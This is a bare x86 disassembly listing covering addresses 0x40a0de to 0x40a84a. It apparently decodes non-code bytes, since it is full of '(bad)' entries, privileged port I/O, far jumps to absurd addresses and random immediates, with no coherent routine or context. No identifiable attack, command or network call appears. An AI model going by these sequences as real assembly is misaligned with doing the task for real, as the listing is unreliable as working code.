  40a0de:	adc    BYTE PTR [eax],ah
  40a0e0:	inc    esi
  40a0e1:	adc    DWORD PTR [ebx-0x4ec3e777],edx
  40a0e7:	int3   
  40a0e8:	popa   
  40a0e9:	sbb    DWORD PTR [esp+esi*8-0x58],edi
  40a0ed:	or     edi,DWORD PTR [edx]
  40a0ef:	mov    eax,0x31e39c0e
  40a0f4:	jge    0x40a098
  40a0f6:	fld    TBYTE PTR [edi-0x47036a7d]
  40a0fc:	mov    al,ds:0x81c273c8
  40a101:	adc    edi,ebx
  40a103:	jbe    0x40a0bd
  40a105:	sar    BYTE PTR [edx+ecx*4],0xaf
  40a109:	mov    ds:0xcaedd67a,eax
  40a10e:	pop    es
  40a10f:	cmp    BYTE PTR [ebp-0x18],0x6d
  40a113:	loope  0x40a18e
  40a115:	ror    DWORD PTR [edi-0x681e7413],0x46
  40a11c:	das    
  40a11d:	scas   al,BYTE PTR es:[edi]
  40a11e:	cmovbe ebx,ecx
  40a121:	add    eax,esi
  40a123:	xchg   ecx,eax
  40a124:	add    DWORD PTR [esi-0x7b],ebx
  40a127:	jo     0x40a11c
  40a129:	ret    0xf076
  40a12c:	std    
  40a12d:	push   0x6c702414
  40a132:	add    bl,BYTE PTR ds:0xedc7e68c
  40a138:	pop    ss
  40a139:	std    
  40a13a:	ficom  WORD PTR [edi]
  40a13c:	add    dl,BYTE PTR [ebp-0x7831de86]
  40a142:	xor    ah,BYTE PTR [eax+0x2bc8f198]
  40a148:	(bad)  
  40a149:	js     0x40a0f5
  40a14b:	(bad)
  40a14f:	(bad)  
  40a150:	adc    eax,0xb55a58e5
  40a155:	push   ss
  40a156:	or     DWORD PTR [ecx],eax
  40a158:	rol    BYTE PTR [ecx+ebx*2],cl
  40a15b:	adc    al,0x50
  40a15d:	sbb    BYTE PTR [eax],0x49
  40a160:	mov    al,ds:0x75230872
  40a165:	pusha  
  40a166:	call   0x673a:0xbb7943a0
  40a16d:	int    0x9
  40a16f:	out    dx,eax
  40a170:	push   0x66ba0722
  40a175:	adc    al,0xc4
  40a177:	push   cs
  40a178:	inc    ebx
  40a179:	push   eax
  40a17a:	jmp    0x1a35:0x1e8cdb04
  40a181:	cs leave 
  40a183:	push   esi
  40a184:	ins    BYTE PTR es:[edi],dx
  40a185:	sub    eax,0xae9837eb
  40a18a:	cmp    DWORD PTR [esi+0x6656b160],0xfbf29557
  40a194:	cmp    ah,BYTE PTR [eax+0x49]
  40a197:	sti    
  40a198:	xor    al,ch
  40a19a:	aad    0x29
  40a19c:	imul   DWORD PTR [eax+0x27]
  40a19f:	xchg   esp,eax
  40a1a0:	xchg   ebp,eax
  40a1a1:	dec    esp
  40a1a2:	xor    al,BYTE PTR fs:[ecx-0xb259a37]
  40a1a9:	nop    ebp
  40a1ac:	add    al,0x20
  40a1ae:	xchg   edx,eax
  40a1af:	mov    ecx,0xf34e2f7a
  40a1b4:	dec    edi
  40a1b5:	jmp    0x9a4bdfdf
  40a1ba:	push   ds
  40a1bb:	jl     0x40a1b4
  40a1bd:	xchg   BYTE PTR [eax+0x5a26b756],dl
  40a1c3:	xchg   esp,eax
  40a1c4:	(bad)  
  40a1c5:	call   0xf12ef195
  40a1ca:	fndisi(8087 only) 
  40a1cc:	dec    DWORD PTR [edx-0x31]
  40a1cf:	ins    BYTE PTR es:[edi],dx
  40a1d0:	xchg   edx,eax
  40a1d1:	and    DWORD PTR [ebx+0x65530adc],0xc28c2e4e
  40a1db:	mov    ecx,0x30e4c1e2
  40a1e0:	cdq    
  40a1e1:	sbb    al,0x42
  40a1e3:	jg     0x40a218
  40a1e5:	mov    BYTE PTR [ecx+eiz*4+0x18],bl
  40a1e9:	ret    0xe8ce
  40a1ec:	fimul  WORD PTR [ebp-0x62bcd0ce]
  40a1f2:	stos   DWORD PTR es:[edi],eax
  40a1f3:	retf   
  40a1f4:	pop    ebx
  40a1f5:	in     eax,dx
  40a1f6:	and    ebx,ebx
  40a1f8:	pop    es
  40a1f9:	out    dx,eax
  40a1fa:	in     al,dx
  40a1fb:	lahf   
  40a1fc:	dec    edi
  40a1fd:	inc    ecx
  40a1fe:	gs jb  0x40a258
  40a201:	pop    ss
  40a202:	(bad)  
  40a203:	lahf   
  40a204:	or     al,BYTE PTR [esi+edi*4+0x4]
  40a208:	inc    edi
  40a209:	bound  edx,QWORD PTR [ecx+0x5fd07405]
  40a20f:	xor    al,0x77
  40a211:	arpl   ax,bx
  40a213:	inc    edx
  40a214:	adc    DWORD PTR [edx],ecx
  40a216:	pop    edx
  40a217:	imul   ebx,DWORD PTR [edx+0x18],0xa26afda
  40a21e:	sub    eax,DWORD PTR [esi]
  40a220:	mov    dh,0xaf
  40a222:	sti    
  40a223:	not    DWORD PTR ds:[ebx+0x5b]
  40a227:	test   eax,0x545061df
  40a22c:	and    eax,0x9e6baf62
  40a231:	ror    DWORD PTR [ecx+0x3b4af2b4],1
  40a237:	dec    ecx
  40a238:	inc    ebp
  40a239:	imul   edi,DWORD PTR [eax+0x75],0x901e3655
  40a240:	sbb    ah,bh
  40a242:	test   al,0xc7
  40a244:	loope  0x40a282
  40a246:	jbe    0x40a295
  40a248:	hlt    
  40a249:	or     al,0xe3
  40a24b:	addr16 inc esi
  40a24d:	mov    edi,0xcba86e4
  40a252:	inc    esp
  40a253:	dec    ecx
  40a254:	mov    ecx,0x451ef8d4
  40a259:	arpl   WORD PTR [eax+0x13],bx
  40a25c:	push   ss
  40a25d:	push   ds
  40a25e:	xor    al,0x3e
  40a260:	retf   0xa3b5
  40a263:	mov    ch,0xd
  40a265:	cs mov bh,0xcc
  40a268:	xchg   ebp,eax
  40a269:	adc    eax,0x29d91861
  40a26e:	and    DWORD PTR [eax-0x6b],esi
  40a271:	aas    
  40a272:	adc    al,BYTE PTR [edi]
  40a274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a275:	inc    ebp
  40a276:	pushf  
  40a277:	outs   dx,DWORD PTR ds:[esi]
  40a278:	leave  
  40a279:	arpl   WORD PTR [esi-0x2e],dx
  40a27c:	push   esi
  40a27d:	sbb    eax,0x1eb06f11
  40a282:	sar    cl,cl
  40a284:	rcr    dl,cl
  40a286:	sbb    DWORD PTR [esp+eax*2+0x35b064cb],ecx
  40a28d:	scas   al,BYTE PTR es:[edi]
  40a28e:	mov    ch,0xdc
  40a290:	pop    es
  40a291:	push   0xffffff8e
  40a293:	add    eax,0x845e3248
  40a298:	xor    DWORD PTR [edx-0x47],ebx
  40a29b:	daa    
  40a29c:	and    edx,DWORD PTR [edx+0x4930e465]
  40a2a2:	hlt    
  40a2a3:	fist   WORD PTR [edi+0x79]
  40a2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a7:	test   BYTE PTR [esi],dh
  40a2a9:	xor    al,0xf0
  40a2ab:	pop    edx
  40a2ac:	pop    eax
  40a2ad:	stos   DWORD PTR es:[edi],eax
  40a2ae:	sub    eax,0x67fd084b
  40a2b3:	dec    ebp
  40a2b4:	in     eax,0xdc
  40a2b6:	mov    ch,0xb7
  40a2b8:	inc    ebp
  40a2b9:	outs   dx,BYTE PTR ds:[esi]
  40a2ba:	cs nop
  40a2bc:	pusha  
  40a2bd:	loopne 0x40a2c3
  40a2bf:	inc    ebx
  40a2c0:	mov    ecx,ss
  40a2c2:	(bad)  
  40a2c3:	cli    
  40a2c4:	aaa    
  40a2c5:	sub    dl,BYTE PTR [eax]
  40a2c7:	mov    eax,ds:0xe0b3ca67
  40a2cc:	jle    0x40a2b6
  40a2ce:	xchg   ebp,eax
  40a2cf:	sub    eax,0x19bb60d3
  40a2d4:	pop    eax
  40a2d5:	jl     0xa6c449ec
  40a2db:	ds and al,0xf5
  40a2de:	mov    ?,WORD PTR [ecx]
  40a2e0:	pop    esi
  40a2e1:	jno    0x40a32b
  40a2e3:	mov    esp,0xb831e966
  40a2e8:	mov    ds:0x7cff9b8b,eax
  40a2ed:	mov    bl,ch
  40a2ef:	pop    ds
  40a2f0:	loope  0x40a287
  40a2f2:	mov    cl,0x38
  40a2f4:	xor    ch,bl
  40a2f6:	jbe    0x40a305
  40a2f8:	(bad)  
  40a2f9:	dec    ecx
  40a2fa:	push   ss
  40a2fb:	mov    ds:0x16b80e69,eax
  40a300:	and    edx,DWORD PTR [ebx]
  40a302:	mov    ds:0xf0e5821a,eax
  40a307:	out    0x1f,al
  40a309:	dec    eax
  40a30a:	mov    eax,ds:0xca70966a
  40a30f:	inc    esp
  40a310:	and    BYTE PTR [ecx+ecx*1-0x4cd60ebc],bh
  40a317:	push   ebx
  40a318:	sbb    eax,0xc6309e1f
  40a31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a31e:	and    ah,BYTE PTR [eax+0xb39602d]
  40a324:	sar    DWORD PTR [esi+edi*8-0x2b],1
  40a328:	jns    0x40a2f5
  40a32a:	xchg   edx,eax
  40a32b:	hlt    
  40a32c:	(bad)  
  40a32d:	mov    esi,0xd768ce9d
  40a332:	mov    eax,esp
  40a334:	and    edi,DWORD PTR [edx+0x4c15a3dd]
  40a33a:	dec    edi
  40a33b:	cs out 0x1,eax
  40a33e:	out    0xd4,eax
  40a340:	or     DWORD PTR [ebp+0x79],ecx
  40a343:	or     esi,DWORD PTR [esi-0x48]
  40a346:	fs int 0xa5
  40a349:	sub    bh,dh
  40a34b:	sub    BYTE PTR [eax],0x6
  40a34e:	fiadd  WORD PTR [ebx]
  40a350:	push   ss
  40a351:	iret   
  40a352:	xor    cl,bl
  40a354:	into   
  40a355:	and    DWORD PTR [edx],eax
  40a357:	inc    ebp
  40a358:	pop    esp
  40a359:	clc    
  40a35a:	sbb    eax,0xe766b945
  40a35f:	sbb    eax,0x28
  40a362:	outs   dx,BYTE PTR ds:[esi]
  40a363:	xchg   BYTE PTR ds:0x539298dc,al
  40a369:	or     al,0xce
  40a36b:	inc    ebp
  40a36c:	out    0x7,al
  40a36e:	adc    edi,DWORD PTR [esi+0x1d]
  40a371:	aam    0xeb
  40a373:	mov    dh,0xe6
  40a375:	aas    
  40a376:	push   edi
  40a377:	das    
  40a378:	jmp    0xc8fe5619
  40a37d:	iret   
  40a37e:	inc    esi
  40a37f:	pusha  
  40a380:	xor    al,0x8b
  40a382:	and    eax,0xb45a71ff
  40a387:	in     eax,0x9a
  40a389:	aaa    
  40a38a:	jnp    0x40a36f
  40a38c:	sbb    BYTE PTR [edx-0x64],ah
  40a38f:	cwde   
  40a390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a391:	arpl   WORD PTR [ecx],ax
  40a393:	or     BYTE PTR [eax-0x51],bh
  40a396:	jo     0x40a3ef
  40a398:	jg     0x40a38e
  40a39a:	ins    DWORD PTR es:[edi],dx
  40a39b:	cwde   
  40a39c:	repnz repnz sti 
  40a39f:	cld    
  40a3a0:	mov    ch,0xea
  40a3a2:	xor    bh,ch
  40a3a4:	sub    eax,0x9564e10
  40a3a9:	mov    edi,0xe80f3a3d
  40a3ae:	pushf  
  40a3af:	jbe    0x40a3d1
  40a3b1:	pop    ecx
  40a3b2:	adc    dh,bh
  40a3b4:	lds    esi,FWORD PTR [ebx]
  40a3b6:	leave  
  40a3b7:	nop
  40a3b8:	fdiv   DWORD PTR [esp+edi*8]
  40a3bb:	sbb    al,0xa9
  40a3bd:	and    DWORD PTR [eax+0x53],ebx
  40a3c0:	push   esi
  40a3c1:	ja     0x40a362
  40a3c3:	(bad)  
  40a3c5:	inc    eax
  40a3c6:	or     al,0x12
  40a3c8:	add    eax,0x6ee0ed9
  40a3cd:	(bad)  
  40a3ce:	in     al,dx
  40a3cf:	adc    al,0xa
  40a3d1:	xlat   BYTE PTR ds:[ebx]
  40a3d2:	pop    ds
  40a3d3:	cs dec esp
  40a3d5:	outs   dx,DWORD PTR ds:[esi]
  40a3d6:	jg     0x40a3fd
  40a3d8:	xor    al,cl
  40a3da:	aaa    
  40a3db:	hlt    
  40a3dc:	xchg   DWORD PTR [ecx-0x72],eax
  40a3df:	hlt    
  40a3e0:	cdq    
  40a3e1:	add    eax,0x83993d81
  40a3e6:	sbb    eax,0xf982da71
  40a3eb:	ins    BYTE PTR es:[edi],dx
  40a3ec:	push   edi
  40a3ed:	aas    
  40a3ee:	add    esi,DWORD PTR [esi+0x521f417a]
  40a3f4:	pop    ebp
  40a3f5:	scas   eax,DWORD PTR es:[edi]
  40a3f6:	dec    ecx
  40a3f7:	pop    eax
  40a3f8:	push   eax
  40a3f9:	aas    
  40a3fa:	jne    0x40a468
  40a3fc:	aad    0xc7
  40a3fe:	xlat   BYTE PTR ds:[ebx]
  40a3ff:	jae    0x40a446
  40a401:	xchg   esp,eax
  40a402:	mov    dl,0x71
  40a404:	jle    0x40a38d
  40a406:	mov    ds:0xc5f84b2f,al
  40a40b:	pusha  
  40a40c:	arpl   WORD PTR [edx+0x323421ab],sp
  40a412:	or     eax,0x16e16ca9
  40a417:	daa    
  40a418:	out    dx,eax
  40a419:	and    esp,DWORD PTR [edi+0x47]
  40a41c:	retf   
  40a41d:	mov    eax,DWORD PTR [esi-0x1f]
  40a420:	jecxz  0x40a405
  40a422:	je     0x40a3da
  40a424:	test   al,0xf9
  40a426:	xor    eax,0xc153eee9
  40a42b:	ins    DWORD PTR es:[edi],dx
  40a42c:	pop    edx
  40a42d:	icebp  
  40a42e:	jns    0x40a45d
  40a430:	add    eax,0x4df1746
  40a435:	jp     0x40a3b9
  40a437:	test   eax,0xd5bdae4e
  40a43c:	xchg   ebx,eax
  40a43d:	pop    es
  40a43e:	push   edi
  40a43f:	xchg   ebx,eax
  40a440:	sub    BYTE PTR [edi-0x60],dh
  40a443:	xor    esi,DWORD PTR [eax+0x60]
  40a446:	ja     0x40a3f1
  40a448:	in     al,0x25
  40a44a:	mov    cl,0x76
  40a44c:	in     eax,dx
  40a44d:	pop    ss
  40a44e:	(bad)  
  40a44f:	in     al,dx
  40a450:	sub    ebp,esp
  40a452:	cs cdq 
  40a454:	retf   
  40a455:	mov    esp,0xde7e13ea
  40a45a:	retf   0xc072
  40a45d:	inc    edx
  40a45e:	stos   DWORD PTR es:[edi],eax
  40a45f:	adc    ch,BYTE PTR [ebx+0x70]
  40a462:	pop    edx
  40a463:	stos   DWORD PTR es:[edi],eax
  40a464:	sbb    al,0x3d
  40a466:	repnz sub BYTE PTR [ecx],al
  40a469:	xchg   ecx,eax
  40a46a:	add    bh,BYTE PTR [ebx]
  40a46c:	xchg   ebp,eax
  40a46d:	int3   
  40a46e:	mov    edi,0x35be0750
  40a473:	pusha  
  40a474:	sub    al,0xd3
  40a476:	sbb    ebp,DWORD PTR [ebx+0x6d677720]
  40a47c:	popa   
  40a47d:	dec    ecx
  40a47e:	outs   dx,DWORD PTR ds:[esi]
  40a47f:	stos   BYTE PTR es:[edi],al
  40a480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a481:	inc    esi
  40a482:	bound  edx,QWORD PTR [ecx+0x21]
  40a485:	sbb    eax,0xbcc33ae3
  40a48a:	mov    al,0xcb
  40a48c:	mov    al,es:0x37e83482
  40a492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a493:	push   eax
  40a494:	sbb    al,0xec
  40a496:	test   al,0x6e
  40a498:	ins    DWORD PTR es:[edi],dx
  40a499:	(bad)  
  40a49a:	in     al,0xed
  40a49c:	mov    al,ds:0x40712b34
  40a4a1:	mov    edx,DWORD PTR [eax]
  40a4a3:	sbb    al,0xb4
  40a4a5:	pop    edx
  40a4a6:	loope  0x40a515
  40a4a8:	push   esp
  40a4a9:	in     eax,dx
  40a4aa:	jp     0x40a477
  40a4ac:	jne    0x40a4bd
  40a4ae:	sahf   
  40a4af:	(bad)  
  40a4b0:	xchg   esp,eax
  40a4b1:	lea    eax,[eax]
  40a4b3:	adc    ebp,0x3b
  40a4b6:	pop    es
  40a4b7:	retf   
  40a4b8:	mov    esi,0x34b2a6a
  40a4bd:	sti    
  40a4be:	nop
  40a4bf:	fwait
  40a4c0:	mov    dh,0x20
  40a4c2:	xchg   ebx,eax
  40a4c3:	in     eax,0xcd
  40a4c5:	pop    ebp
  40a4c6:	into   
  40a4c7:	xor    esp,esp
  40a4c9:	jo     0x40a50e
  40a4cb:	sbb    ecx,0x7d472a18
  40a4d1:	shl    BYTE PTR [edi-0x24],0x57
  40a4d5:	fs loope 0x40a546
  40a4d8:	ret    
  40a4d9:	cs mov esp,0xf0d1b692
  40a4df:	mov    esp,0xf59ca4f2
  40a4e4:	inc    eax
  40a4e5:	test   al,0x10
  40a4e7:	int3   
  40a4e8:	push   ebp
  40a4e9:	lds    ecx,FWORD PTR [ecx+0x49]
  40a4ec:	mov    dl,0xe2
  40a4ee:	ficom  WORD PTR cs:[ecx-0x76]
  40a4f2:	sbb    BYTE PTR [ebx+0x3043ac49],0x94
  40a4f9:	cmp    eax,ecx
  40a4fb:	imul   DWORD PTR [ebp-0x49]
  40a4fe:	mov    ebp,0x69796f93
  40a503:	sbb    al,0x9f
  40a505:	jns    0x40a4b6
  40a507:	adc    eax,ebx
  40a509:	jb     0x40a583
  40a50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a50c:	sub    al,0xe8
  40a50e:	pop    edx
  40a50f:	nop
  40a510:	jle    0x40a4e3
  40a512:	inc    esi
  40a513:	pop    ebp
  40a514:	aam    0xbd
  40a516:	xchg   edx,eax
  40a517:	out    0xea,al
  40a519:	sub    al,0xe5
  40a51b:	popa   
  40a51c:	mov    esi,0xa99e1927
  40a521:	xchg   ecx,eax
  40a522:	in     al,0xc8
  40a524:	pushf  
  40a525:	mov    esp,0x35561eea
  40a52a:	call   0xfeb1:0xe8bd4298
  40a531:	fist   DWORD PTR [edx+0x73]
  40a534:	lea    esi,[edi-0x60]
  40a537:	inc    eax
  40a538:	mov    ebx,0x51dc005
  40a53d:	imul   ecx,DWORD PTR [edi-0x57433b41],0x5869b463
  40a547:	inc    edx
  40a548:	mov    ecx,0xb7042f67
  40a54d:	jecxz  0x40a535
  40a54f:	lahf   
  40a550:	dec    edx
  40a551:	popf   
  40a552:	out    dx,eax
  40a553:	and    BYTE PTR [ebx],0xd
  40a556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a557:	cmp    edx,eax
  40a559:	cmc    
  40a55a:	shr    DWORD PTR [ecx+0x43335a95],0x85
  40a561:	mov    edx,esi
  40a563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a564:	loop   0x40a50a
  40a566:	inc    ebp
  40a567:	fst    DWORD PTR [eax]
  40a569:	cwde   
  40a56a:	lods   eax,DWORD PTR ds:[si]
  40a56c:	fadd   st(1),st
  40a56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a56f:	pop    ecx
  40a570:	xor    BYTE PTR [edi-0x10],cl
  40a573:	jbe    0x40a57f
  40a575:	jnp    0x40a5a8
  40a577:	ss cmp al,0x14
  40a57a:	popf   
  40a57b:	pop    ecx
  40a57c:	mov    bl,0x53
  40a57e:	in     al,0x3d
  40a580:	mov    cx,0xb3a4
  40a584:	aas    
  40a585:	js     0x40a541
  40a587:	xor    edx,ebx
  40a589:	mov    al,ds:0x13d2aba9
  40a58e:	mov    esp,DWORD PTR [ebp-0xa]
  40a591:	pop    ds
  40a592:	add    bh,bl
  40a594:	add    eax,0xbd7dda60
  40a599:	in     eax,dx
  40a59a:	add    BYTE PTR [ebx],dh
  40a59c:	dec    edi
  40a59d:	add    BYTE PTR [ecx-0x746261c0],dh
  40a5a3:	imul   edi,edi,0x1608fd2a
  40a5a9:	in     al,dx
  40a5aa:	ss aad 0x5
  40a5ad:	fwait
  40a5ae:	or     eax,0xc25d9377
  40a5b3:	mov    bl,0x1b
  40a5b5:	loopne 0x40a5c3
  40a5b7:	data16 mov ch,BYTE PTR [esi+0x19]
  40a5bb:	ret    
  40a5bc:	xchg   ebx,eax
  40a5bd:	mov    edx,0x4a7344f9
  40a5c2:	sub    al,ch
  40a5c4:	push   eax
  40a5c5:	sub    al,0xbe
  40a5c7:	jmp    0x2877:0xe41de211
  40a5ce:	sbb    dl,ch
  40a5d0:	div    BYTE PTR [ebp+edx*8-0x62]
  40a5d4:	adc    ch,BYTE PTR [edx+eax*1]
  40a5d7:	jb     0x40a603
  40a5d9:	int3   
  40a5da:	daa    
  40a5db:	push   ecx
  40a5dc:	jecxz  0x40a5ca
  40a5de:	ins    DWORD PTR es:[edi],dx
  40a5df:	pop    edx
  40a5e0:	inc    ebx
  40a5e1:	stos   DWORD PTR es:[edi],eax
  40a5e2:	push   edi
  40a5e3:	not    BYTE PTR [edx]
  40a5e5:	sbb    esp,DWORD PTR [edx]
  40a5e7:	dec    edi
  40a5e8:	xlat   BYTE PTR ds:[ebx]
  40a5e9:	dec    ecx
  40a5ea:	mov    BYTE PTR [ebx-0x33dab5d0],al
  40a5f0:	ret    0x4942
  40a5f3:	inc    ecx
  40a5f4:	popa   
  40a5f5:	xor    al,0x8d
  40a5f7:	dec    esi
  40a5f8:	ja     0x40a586
  40a5fa:	adc    al,0xa1
  40a5fc:	pop    ss
  40a5fd:	mov    BYTE PTR [edx],ah
  40a5ff:	sub    BYTE PTR [esi],bh
  40a601:	ficom  WORD PTR ds:0x96d4471d
  40a607:	and    BYTE PTR [edi+0x65061f72],ah
  40a60d:	dec    ecx
  40a60e:	jl     0x40a5f9
  40a610:	cmovs  ecx,DWORD PTR [eax+0x3b045a88]
  40a617:	imul   edi,DWORD PTR [edx],0xc9032a27
  40a61d:	lods   al,BYTE PTR ds:[esi]
  40a61e:	std    
  40a61f:	and    cl,al
  40a621:	out    0x88,eax
  40a623:	mov    ss,edx
  40a625:	inc    ecx
  40a626:	in     eax,dx
  40a627:	aad    0x72
  40a629:	fcom   DWORD PTR [eax+ecx*2]
  40a62c:	dec    eax
  40a62d:	or     ebx,DWORD PTR [eax+0x1298074]
  40a633:	xor    al,BYTE PTR [ebx]
  40a635:	push   eax
  40a636:	mov    dh,0x79
  40a638:	cmp    BYTE PTR [ebp+0x2d4e062e],ch
  40a63e:	scas   al,BYTE PTR es:[edi]
  40a63f:	lock xchg edi,eax
  40a641:	mov    esi,0xc852338e
  40a646:	int    0xdb
  40a648:	and    DWORD PTR [edi+0x1aea8ac0],eax
  40a64e:	jecxz  0x40a62c
  40a650:	fst    QWORD PTR [ebx-0x23]
  40a653:	xchg   ecx,eax
  40a654:	popa   
  40a655:	cmp    al,0x1a
  40a657:	xchg   ecx,edi
  40a659:	jp     0x40a65f
  40a65b:	jae    0x40a636
  40a65d:	ja     0x40a67f
  40a65f:	into   
  40a660:	fidiv  WORD PTR [edi-0x48f7928b]
  40a666:	adc    DWORD PTR ds:0x73ba58c3,eax
  40a66c:	cmp    al,0x30
  40a66e:	(bad)  ds:0xbeba275e
  40a674:	int    0xad
  40a676:	lock pop eax
  40a678:	fcmovnb st,st(0)
  40a67a:	mov    eax,ds:0x1bf154bb
  40a67f:	and    al,0xea
  40a681:	mov    al,es:0x6065bc65
  40a687:	push   0x45
  40a689:	dec    edx
  40a68a:	sub    al,al
  40a68c:	lock push ebx
  40a68e:	ds dec esi
  40a690:	adc    BYTE PTR [edi+0x4c],al
  40a693:	push   ebp
  40a694:	repz es adc eax,0x9ab1944
  40a69b:	add    dh,dh
  40a69d:	xlat   BYTE PTR ds:[ebx]
  40a69e:	mov    bl,0x68
  40a6a0:	mov    ah,0xa8
  40a6a2:	add    DWORD PTR [ebx+ebp*1-0x3ad8ff77],esp
  40a6a9:	rcl    DWORD PTR ds:0x4f52377e,1
  40a6af:	or     BYTE PTR [edi],dl
  40a6b1:	sub    DWORD PTR [ecx-0x51ef157e],0xb35161a1
  40a6bb:	dec    DWORD PTR [ebp+0x66]
  40a6be:	xlat   BYTE PTR ds:[ebx]
  40a6bf:	das    
  40a6c0:	add    eax,0xa1e87c0
  40a6c5:	cdq    
  40a6c6:	push   ebp
  40a6c7:	imul   edx,ecx,0x6754164d
  40a6cd:	sbb    edi,DWORD PTR [ebx-0x496c51cb]
  40a6d3:	or     edx,DWORD PTR [edx]
  40a6d5:	cmc    
  40a6d6:	xchg   DWORD PTR [ecx+0x358232ec],ecx
  40a6dc:	jb     0x40a6ed
  40a6de:	frstor [edi]
  40a6e0:	inc    eax
  40a6e1:	fild   DWORD PTR [eax]
  40a6e3:	pop    esi
  40a6e4:	xor    al,0x49
  40a6e6:	adc    ebp,DWORD PTR [edi]
  40a6e8:	nop
  40a6e9:	std    
  40a6ea:	repz jmp 0x40a72e
  40a6ed:	sub    eax,0xe969cdae
  40a6f2:	sbb    DWORD PTR [esi],0xfdba12bd
  40a6f8:	or     BYTE PTR [edi+0x533fbb5],al
  40a6fe:	push   ss
  40a6ff:	jp     0x40a73e
  40a701:	or     DWORD PTR [ebx+0x574f59ea],0xedd27fdd
  40a70b:	ds scas eax,DWORD PTR es:[edi]
  40a70d:	icebp  
  40a70e:	cmp    DWORD PTR [edi-0x7],esi
  40a711:	mov    cl,0x1e
  40a713:	push   es
  40a714:	int    0x73
  40a716:	jnp    0x40a704
  40a718:	vmread DWORD PTR [ecx+0x33],edx
  40a71c:	(bad)  
  40a71d:	cmp    eax,DWORD PTR [ebp+0x7a3ffe49]
  40a723:	or     eax,0x16be0c66
  40a728:	dec    eax
  40a729:	mov    cl,0xbd
  40a72b:	push   ebp
  40a72c:	call   0xd142e89a
  40a731:	xchg   esi,eax
  40a732:	inc    ebx
  40a733:	(bad)  
  40a734:	or     edi,DWORD PTR [ecx]
  40a736:	jb     0x40a787
  40a738:	pop    ds
  40a739:	in     eax,0x44
  40a73b:	mov    ch,BYTE PTR [edi+ebp*4-0x3ed54701]
  40a742:	jecxz  0x40a6d0
  40a744:	fiadd  WORD PTR [eax-0x77]
  40a747:	push   edi
  40a748:	pop    eax
  40a749:	cs sbb dh,0x13
  40a74d:	jmp    0x40a75f
  40a74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a750:	dec    ecx
  40a751:	out    0x19,al
  40a753:	add    eax,0x3d8c6748
  40a758:	in     eax,0xdc
  40a75a:	bound  esp,QWORD PTR [esp+eiz*2+0x15ee1fca]
  40a761:	jae    0x40a7b5
  40a763:	ds loop 0x40a7a0
  40a766:	lock pop es
  40a768:	xor    BYTE PTR [edx],cl
  40a76a:	xchg   esp,eax
  40a76b:	mov    al,ds:0xa34e95db
  40a770:	mov    al,0xd9
  40a772:	mov    cl,0xf6
  40a774:	int    0x86
  40a776:	add    eax,0xbe592ba2
  40a77b:	ror    BYTE PTR [esi-0x2c],0x7d
  40a77f:	sbb    BYTE PTR gs:[edi],bl
  40a782:	mov    eax,0x40310ce8
  40a787:	out    dx,eax
  40a788:	mov    eax,0x92caacb2
  40a78d:	ror    DWORD PTR [edx+0x6f],cl
  40a790:	aaa    
  40a791:	ret    
  40a792:	test   BYTE PTR [ecx+0x4],cl
  40a795:	and    eax,0xceeb031a
  40a79a:	inc    eax
  40a79b:	cmp    DWORD PTR [eax+0x52321d81],esp
  40a7a1:	aas    
  40a7a2:	mov    eax,ds:0x91880f65
  40a7a7:	stos   BYTE PTR es:[edi],al
  40a7a8:	repz pop esi
  40a7aa:	pop    ebx
  40a7ab:	inc    eax
  40a7ac:	je     0x40a811
  40a7ae:	loopne 0x40a822
  40a7b0:	push   edi
  40a7b1:	scas   eax,DWORD PTR es:[edi]
  40a7b2:	lods   al,BYTE PTR cs:[esi]
  40a7b4:	dec    edi
  40a7b5:	jno    0x40a74b
  40a7b7:	dec    DWORD PTR [eax-0x7b]
  40a7ba:	ins    DWORD PTR es:[edi],dx
  40a7bb:	(bad)  
  40a7bc:	push   0x28
  40a7be:	fistp  WORD PTR [edx-0x2b]
  40a7c1:	xchg   ebx,eax
  40a7c2:	add    al,BYTE PTR [ebp-0x79]
  40a7c5:	or     eax,0x59e4207f
  40a7ca:	psubq  mm6,QWORD PTR [esi+0x1f]
  40a7ce:	sub    ebp,DWORD PTR [eax-0x56]
  40a7d1:	pop    ecx
  40a7d2:	fdivr  st(6),st
  40a7d4:	and    DWORD PTR [edx],ebx
  40a7d6:	fdiv   DWORD PTR [ebp+esi*8+0x2eaf2431]
  40a7dd:	ds sti 
  40a7df:	arpl   si,bx
  40a7e1:	mov    ebx,0x7ddd5a79
  40a7e6:	mov    ebp,0xf7ff8b54
  40a7eb:	int3   
  40a7ec:	shr    BYTE PTR [esi],0x3a
  40a7ef:	mov    ds:0x4e601a27,al
  40a7f4:	out    0xdf,eax
  40a7f6:	lds    edi,FWORD PTR [esi]
  40a7f8:	aas    
  40a7f9:	sar    DWORD PTR [eax],0x6
  40a7fc:	cmp    DWORD PTR [edx-0x59],edx
  40a7ff:	mov    ecx,0xf197196b
  40a804:	ds mov cl,0x20
  40a807:	push   eax
  40a808:	clc    
  40a809:	stc    
  40a80a:	clc    
  40a80b:	call   0x819e4
  40a810:	inc    ecx
  40a811:	test   al,0x82
  40a813:	push   es
  40a814:	gs jp  0x40a831
  40a817:	jb     0x40a7c7
  40a819:	adc    BYTE PTR [esi-0x3d09ff02],0xc5
  40a820:	mov    dh,0x17
  40a822:	mov    edx,0xa8616d6a
  40a827:	pop    esi
  40a828:	or     eax,0xa23d261a
  40a82d:	dec    esp
  40a82e:	mov    ah,0x1
  40a830:	lods   eax,DWORD PTR ds:[esi]
  40a831:	mov    ds:0xd357abf3,eax
  40a836:	xor    ah,ch
  40a838:	sbb    al,0x98
  40a83a:	lods   eax,DWORD PTR ds:[esi]
  40a83b:	jg     0x40a878
  40a83d:	rcr    BYTE PTR [esi],cl
  40a83f:	fcmovu st,st(5)
  40a841:	pop    esi
  40a842:	dec    DWORD PTR [ebp-0x6cd604cd]
  40a848:	add    cl,BYTE PTR [ebx]
  40a84a:	jbe    0x40a82e
